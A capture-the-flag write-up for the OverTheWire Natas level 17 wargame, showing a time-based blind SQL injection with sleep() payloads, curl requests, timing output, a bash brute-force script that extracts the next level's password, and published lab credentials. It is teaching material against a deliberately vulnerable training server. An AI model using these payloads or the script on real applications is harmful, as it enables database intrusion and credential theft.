# BANDIT LEVEL 17

```
http://overthewire.org/wargames/natas/natas17.html
```

```
Username: natas17
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
URL:      http://natas17.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

#### CODE INSPECTION

```
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas17</h1> 
<div id="content"> 
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
<input type="submit" value="Check existence" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
```

So we have the SQL injection scenario where we can query against a user name
and know from the source code that there is a database which has both username
and password in the table.  Presumably there is a user `natas18` in the DB and
we need to use SQL injection against the query to derive the password.

The twist on the prior level challenge is that the webapp doesn't explicitly
leak information to us on whether the user exists or not (and therefore we
can't exploit that mechanism to derive whether or SQL injected query was
successful or not to derive the password like we did before by searching
character by character against a username/password combo - aka our "blind SQL
injection" attack).

#### SIDE CHANNEL ATTACK

Reading a blog post about an SQL injection attack that used the `sleep()`
command as a DOS attack..

```
https://blog.pythian.com/mysql-injection-sleep/
```

.. what if we used `sleep()` to help us leak information about whether our
SQL query was succesful or not? If we chained together our SELECT query with
an `AND sleep()`, if the query failed, the `sleep()` wouldn't be executed
since the whole statement couldn't be true so the `AND` clause would be
skipped. However, if our SELECT query succeeded, the `sleep()` would be
executed since the `AND` would need to be evaluated to determine the logical
answer of the whole `AND` statement.

Attempting an injection using a username like:

```
natas18" AND sleep(5) #
```

.. should result in a SQL query like:

```
SELECT * from users where username="natas18" AND sleep(5) # "
```

```
$ time curl --silent "http://natas17.natas.labs.overthewire.org/?username=natas18%22%20AND%20sleep%285%29%20%23%20&debug" -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
Executing query: SELECT * from users where username="natas18" AND sleep(5) # "<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

real    0m6.975s
user    0m0.005s
sys    0m0.007s
```

The `debug` flag confirms the SQL query which results from our injection and
the `time` command validates that our query took >5 seconds indicating that
there likely is a user called `natas18`. Let's see what happens if we had a
likely non-existent user `foobar`..

```
$ time curl --silent "http://natas17.natas.labs.overthewire.org/?username=foobar%22%20AND%20sleep%285%29%20%23%20&debug" -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
Executing query: SELECT * from users where username="foobar" AND sleep(5) # "<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

real    0m0.948s
user    0m0.006s
sys    0m0.011s
```

The command returns in under 1 second. Looks like our side-channel attack is
working! Now we can proceed with our blind SQL injection attack to query the
database with a series of passwords to derive the correct one.

#### BLIND SQL INJECTION VIA SIDE CHANNEL ATTACK

Let's modify our username name injection to something like:

```
natas18" AND password LIKE BINARY "$PW%" AND sleep(5) #
```

.. should result in a SQL query like:

```
SELECT * from users where username="natas18" AND password LIKE BINARY "$PW%"  AND sleep(5) # "
```

Let's see if `natas18` password begins with `a` by supplying "a%" as the
pattern to `LIKE BINARY`..

```
$ time curl --silent "http://natas17.natas.labs.overthewire.org/?username=natas18%22%20AND%20password%20LIKE%20BINARY%20%22a%25%22%20AND%20sleep%285%29%20%23%20&debug" -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
Executing query: SELECT * from users where username="natas18" AND password LIKE BINARY "a%" AND sleep(5) # "<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

real    0m0.811s
user    0m0.004s
sys    0m0.006s
```

We can see the SQL command looks like what we expected and the command executed
in less than 1 second, implying that the first letter of the password is not
`a`.

After a few tries, we come across a different result with `x` as the first
letter of the password..

```
$ time curl --silent "http://natas17.natas.labs.overthewire.org/?username=natas18%22%20AND%20password%20LIKE%20BINARY%20%22x%25%22%20AND%20sleep%285%29%20%23%20&debug" -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' >/dev/null

real    0m5.345s
user    0m0.004s
sys    0m0.006s
```

Using `x` as the first letter results in the command completing in >5 seconds
which implies the SQL SELECT query was successful and forced the execution of
our `sleep(5)`.

#### BRUTE FORCE

Let's script up a brute force attack..

```
$ cat script.sh
#! /bin/bash

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""
  local pos c o

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER)
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}

export PASSWORD

# we assume the password length is 32
for i in {0..31}
do

  # loop through all valid possible characters
  for CH in {{0..9},{a..z},{A..Z}}
  do
    PASSWORD[$i]=$CH

    #
    # our SQL injection is USERNAME='natas18" AND password LIKE BINARY "TESTSTRING%" AND sleep(5) # '
    #
    # SELECT * from users where username="natas18" AND password LIKE BINARY "TESTSTRING%"  AND sleep(5) # "
    #
    INJECTION_BEG="$( rawurlencode 'natas18" AND password LIKE BINARY "' )"
    TESTSTRING=$(printf "%s" "${PASSWORD[@]}")
    INJECTION_END="$( rawurlencode '%" AND sleep(5) # ' )"

    # the last echo'ed $TESTSTRING would represent the working usr/passwd combo
    echo "PASSWORD: $TESTSTRING"

    # use time as a side channel attack
    TIMEOUTPUT=$( (time -p curl --silent \
      "http://natas17.natas.labs.overthewire.org/?username=${INJECTION_BEG}${TESTSTRING}${INJECTION_END}&debug" \
      -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' \
      >/dev/null) 2>&1) # the "2>&1" is necessary cuz time() outputs to STDERR

    # TIMEOUTPUT should be something like:
    #   real 0.00
    #   user 0.00
    #   sys 0.00
    # 1. grab just the real time (ignore system and user time)
    # 2. drop the "real" string
    TIME="$(echo $TIMEOUTPUT | \
      grep real | \
      cut -f 2 -d ' ')"

   # use "binary calcuator" since bash doesn't do floating point natively
   ISGREATERTHANFIVESECONDS=$( echo $TIME '>' 5 | bc -l )
   if [ $ISGREATERTHANFIVESECONDS -eq 1 ]; then
      # if the string "This user exists." it means our user+pw combo worked
      # and we can move onto the next character
      break;
   fi
  done

done
```

```
$ ./script.sh
PASSWORD: 0
PASSWORD: 1
PASSWORD: 2
PASSWORD: 3
PASSWORD: 4
PASSWORD: 5
PASSWORD: 6

<...>

PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFq
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFr
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFs
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFs0
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFs1
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFs2

<...>

PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdI
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdJ
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdK
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdL
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdM
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdN
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdO
PASSWORD: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```
